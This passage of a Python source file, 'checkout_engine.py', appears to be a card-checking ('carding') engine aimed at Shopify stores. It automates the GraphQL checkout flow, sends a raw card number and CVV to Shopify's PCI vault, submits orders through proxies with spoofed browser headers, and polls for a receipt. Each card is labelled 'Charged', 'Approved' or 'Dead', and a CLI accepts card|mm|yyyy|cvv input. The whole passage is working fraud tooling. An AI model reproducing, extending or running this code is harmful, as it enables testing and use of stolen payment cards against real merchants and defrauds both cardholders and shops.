            result.error = Exception("no payment method")
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        _mark("step4_proposal1", t0)

        # step 5 — second Proposal (with delivery handle filled)
        t0 = time.time()
        proposal_vars["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
            "deliveryStrategyByHandle": {
                "handle": delivery_strategy,
                "customDeliveryRate": False,
            },
            "options": {},
        }
        proposal_vars["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
            "lines": [{"stableId": stable_id}]
        }
        proposal_vars["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
            "value": {"amount": str(shipping_amount), "currencyCode": currency}
        }
        proposal_vars["delivery"]["deliveryLines"][0]["destinationChanged"] = False
        proposal_vars["payment"]["billingAddress"] = {
            "streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": postal,
                "firstName": first, "lastName": last,
                "zoneCode": state, "phone": phone,
            }
        }
        proposal_vars["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
        proposal_vars["buyerIdentity"]["shopPayOptInPhone"] = {"countryCode": country_code, "number": phone}

        try:
            async with session.post(gql_url, params={"operationName": "Proposal"},
                                    headers=gql_headers, proxy=proxy,
                                    json={"query": _QUERY_PROPOSAL,
                                          "variables": proposal_vars,
                                          "operationName": "Proposal"}) as r:
                proposal2_text = await r.text()
        except Exception:
            proposal2_text = ""

        if proposal2_text:
            try:
                pj2 = json.loads(proposal2_text)
                n2 = pj2.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
                seller2 = n2.get("sellerProposal") or {}
                if seller2:
                    rt2 = seller2.get("runningTotal", {}).get("value", {}).get("amount")
                    if rt2: running_total = rt2
                    result.amount = running_total
            except Exception:
                pass
        _mark("step5_proposal2", t0)

        # step 6 — PCI tokenization
        t0 = time.time()
        try:
            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mm), "year": int(yyyy),
                    "verification_value": cvv,
                    "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{first} {last}",
                },
                "payment_session_scope": urllib.parse.urlparse(shop_url).netloc,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html",
                "User-Agent": ua,
                "sec-ch-ua": '"Chromium";v="124", "Not/A)Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-fetch-storage-access": "active",
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig
            async with session.post("https://checkout.pci.shopifyinc.com/sessions",
                                    json=vault_payload, headers=vault_headers,
                                    proxy=proxy) as vr:
                vt = await vr.json(content_type=None)
            token = vt.get("id")
            if not token:
                raise Exception("no pci token")
        except Exception as e:
            result.error = Exception(f"pci: {e}")
            result.retryable = True
            _mark("step6_pci", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step6_pci", t0)

        # step 7 — Submit
        t0 = time.time()
        submit_input = {
            "sessionInput": {"sessionToken": sst},
            "queueToken": queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": postal,
                            "firstName": first, "lastName": last,
                            "zoneCode": state, "phone": phone,
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy,
                            "customDeliveryRate": False,
                        },
                        "options": {"phone": phone},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                    "destinationChanged": False,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": True,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            },
            "merchandise": proposal_vars["merchandise"],
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [{
                    "paymentMethod": {
                        "directPaymentMethod": {
                            "paymentMethodIdentifier": payment_id,
                            "sessionId": token,
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": postal,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "cardSource": None,
                        }
                    },
                    "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                    "dueAt": None,
                }],
                "billingAddress": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": postal,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                "email": email, "emailChanged": False,
                "phoneCountryCode": country_code,
                "marketingConsent": [{"email": {"value": email}}],
                "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                "rememberMe": False,
            },
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "optionalDuties": {"buyerRefusesDuties": False},
        }
        if checkpoint_data:
            submit_input["checkpointData"] = checkpoint_data

        submit_vars = {
            "input": submit_input,
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": checkout_url},
        }

        try:
            async with session.post(gql_url, params={"operationName": "SubmitForCompletion"},
                                    headers=gql_headers, proxy=proxy,
                                    json={"query": _MUTATION_SUBMIT,
                                          "variables": submit_vars,
                                          "operationName": "SubmitForCompletion"}) as r:
                submit_text = await r.text()
        except Exception as e:
            result.error = Exception(f"submit net: {e}")
            result.retryable = True
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if "CAPTCHA_REQUIRED" in submit_text.upper():
            result.status_code = "CAPTCHA_REQUIRED"
            result.error = Exception("captcha on submit")
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        try:
            sj = json.loads(submit_text)
        except Exception:
            result.status_code = "SUBMIT_INVALID_JSON"
            result.error = Exception(submit_text[:150])
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        sdata = sj.get("data", {}).get("submitForCompletion", {}) or {}
        stype = sdata.get("__typename", "")

        if stype == "SubmitFailed":
            reason = sdata.get("reason", "unknown")
            result.status = CheckStatus.DECLINED
            result.status_code = _map_reason(reason)
            result.error = Exception(str(reason)[:120])
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if stype == "SubmitRejected":
            errs = sdata.get("errors") or []
            code = "SUBMIT_REJECTED"
            msg = ""
            for e in errs:
                c = e.get("code")
                m = e.get("localizedMessage") or e.get("nonLocalizedMessage")
                if c and c not in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                    code = c
                    break
                if m:
                    msg = m
            result.status = CheckStatus.DECLINED
            result.status_code = _map_reason(code if code else msg)
            result.error = Exception((code or msg or "rejected")[:120])
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if stype == "Throttled":
            result.status_code = "THROTTLED"
            result.retryable = True
            result.error = Exception("throttled on submit")
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        # Try to extract receipt id
        receipt = sdata.get("receipt") or {}
        rid = receipt.get("id")
        if not rid:
            # Sometimes returns SubmittedForCompletion without full receipt
            if stype in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                # fallthrough — try to parse via regex on raw text
                m = re.search(r'"id"\s*:\s*"(gid://shopify/[^"]*Receipt[^"]*)"', submit_text)
                if m: rid = m.group(1)

        if not rid:
            result.status_code = "NO_RECEIPT_ID"
            result.error = Exception("no receipt id")
            result.retryable = True
            _mark("step7_submit", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step7_submit", t0)

        # step 8 — poll
        t0 = time.time()
        for attempt in range(6):
            try:
                async with session.post(gql_url, params={"operationName": "PollForReceipt"},
                                        headers=gql_headers, proxy=proxy,
                                        json={"query": _QUERY_POLL,
                                              "variables": {"receiptId": rid, "sessionToken": sst},
                                              "operationName": "PollForReceipt"}) as r:
                    poll_text = await r.text()
            except Exception:
                await asyncio.sleep(2)
                continue

            try:
                pj = json.loads(poll_text)
                rdata = pj.get("data", {}).get("receipt", {}) or {}
                ptype = rdata.get("__typename", "")
            except Exception:
                await asyncio.sleep(2)
                continue

            if ptype == "ProcessedReceipt":
                result.status = CheckStatus.CHARGED
                result.status_code = "ORDER_PLACED"
                conf = rdata.get("confirmationPage") or {}
                result.receipt_url = conf.get("url") or rdata.get("orderStatusPageUrl") or ""
                _mark("step8_poll", t0)
                result.duration_ms = int((time.time() - t_start) * 1000)
                return result

            if ptype == "ActionRequiredReceipt":
                result.status = CheckStatus.APPROVED
                result.status_code = "OTP_REQUIRED"
                _mark("step8_poll", t0)
                result.duration_ms = int((time.time() - t_start) * 1000)
                return result

            if ptype == "FailedReceipt":
                err = rdata.get("processingError") or {}
                code = err.get("code") or err.get("__typename") or "FAILED"
                msg = err.get("messageUntranslated", "")
                result.status = CheckStatus.DECLINED
                result.status_code = _map_reason(code)
                result.error = Exception(str(msg or code)[:120])
                _mark("step8_poll", t0)
                result.duration_ms = int((time.time() - t_start) * 1000)
                return result

            # ProcessingReceipt / WaitingReceipt — keep polling
            await asyncio.sleep(3)

        result.status = CheckStatus.ERROR
        result.status_code = "POLL_TIMEOUT"
        result.error = Exception("poll timeout")
        _mark("step8_poll", t0)
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result


def _map_reason(raw: str) -> str:
    if not raw: return "UNKNOWN"
    s = str(raw).upper().replace(" ", "_")
    s = re.sub(r'[^A-Z0-9_$.:\-]', '', s)
    return s[:80]


# ──────────────────────── Public API ─────────────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str,
                          proxy_url: str = "", low: bool = True) -> CheckResult:
    try:
        return asyncio.run(_check_card_async(shop_url, card_entry, proxy_url, low))
    except RuntimeError:
        # already in a loop — spin up a new one in a fresh thread
        import concurrent.futures as cf
        with cf.ThreadPoolExecutor(max_workers=1) as ex:
            return ex.submit(
                lambda: asyncio.run(_check_card_async(shop_url, card_entry, proxy_url, low))
            ).result()


def run_checkout_public(shop_url: str, card: str, proxy_url: str = "",
                        low: bool = True) -> dict:
    res = run_checkout_for_card(shop_url, card, proxy_url, low=low)
    name = res.status.name
    try:
        price_value = float(res.amount) if res.amount else 0.0
    except Exception:
        price_value = 0.0

    base = {
        "card": card, "site": shop_url, "gateway": "Shopify",
        "price": res.amount or "-", "price_value": price_value, "proxy": proxy_url,
        "currency": res.currency or "USD", "receipt_url": res.receipt_url or "",
        "duration_ms": res.duration_ms, "stage_timings": res.stage_timings,
    }
    if name == "CHARGED":
        return {**base, "status": "Charged", "message": res.status_code or "ORDER_PLACED",
                "status_code": "ORDER_PLACED", "retryable": False}
    if name == "APPROVED":
        return {**base, "status": "Approved", "message": res.status_code or "APPROVED",
                "status_code": res.status_code or "APPROVED", "retryable": False}
    if name == "DECLINED":
        return {**base, "status": "Dead", "message": res.status_code or "CARD_DECLINED",
                "status_code": res.status_code or "CARD_DECLINED", "retryable": False}
    return {**base, "status": "Error", "message": str(res.error or "error")[:150],
            "status_code": res.status_code or "ERROR", "retryable": res.retryable}


async def run_checkout_async(shop_url: str, card: str, proxy_url: str = "",
                             low: bool = True) -> dict:
    res = await _check_card_async(shop_url, card, proxy_url, low=low)
    name = res.status.name
    try:
        price_value = float(res.amount) if res.amount else 0.0
    except Exception:
        price_value = 0.0
    base = {
        "card": card, "site": shop_url, "gateway": "Shopify",
        "price": res.amount or "-", "price_value": price_value, "proxy": proxy_url,
        "currency": res.currency or "USD", "receipt_url": res.receipt_url or "",
        "duration_ms": res.duration_ms, "stage_timings": res.stage_timings,
    }
    if name == "CHARGED":
        return {**base, "status": "Charged", "message": res.status_code or "ORDER_PLACED",
                "status_code": "ORDER_PLACED", "retryable": False}
    if name == "APPROVED":
        return {**base, "status": "Approved", "message": res.status_code or "APPROVED",
                "status_code": res.status_code or "APPROVED", "retryable": False}
    if name == "DECLINED":
        return {**base, "status": "Dead", "message": res.status_code or "CARD_DECLINED",
                "status_code": res.status_code or "CARD_DECLINED", "retryable": False}
    return {**base, "status": "Error", "message": str(res.error or "error")[:150],
            "status_code": res.status_code or "ERROR", "retryable": res.retryable}


def set_hit_callback(fn: Callable[[dict], None]):
    global _HIT_CALLBACK
    _HIT_CALLBACK = fn


def engine_stats() -> dict:
    return {
        "version": VERSION,
        "bin_cache_size": len(_BIN_CACHE),
        "engine": "graphql-inline",
    }


# ──────────────────────── CLI ────────────────────────────────────────

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 6:
        print("Usage: python checkout_engine.py <card> <mm> <yyyy> <cvv> <shop_url> [proxy]")
        print(f"Version: {VERSION}")
        sys.exit(1)
    card = f"{sys.argv[1]}|{sys.argv[2]}|{sys.argv[3]}|{sys.argv[4]}"
    shop = sys.argv[5]
    proxy = sys.argv[6] if len(sys.argv) > 6 else ""
    print(f"\nShopify Engine v{VERSION}\n  Card:  {card}\n  Site:  {shop}\n  Proxy: {proxy or '(none)'}\n")
    r = run_checkout_public(shop, card, proxy, True)
    for k, v in r.items():
        print(f"  {k}: {v}")
    sys.exit(0 if r.get("status") in ("Charged", "Approved") else 1)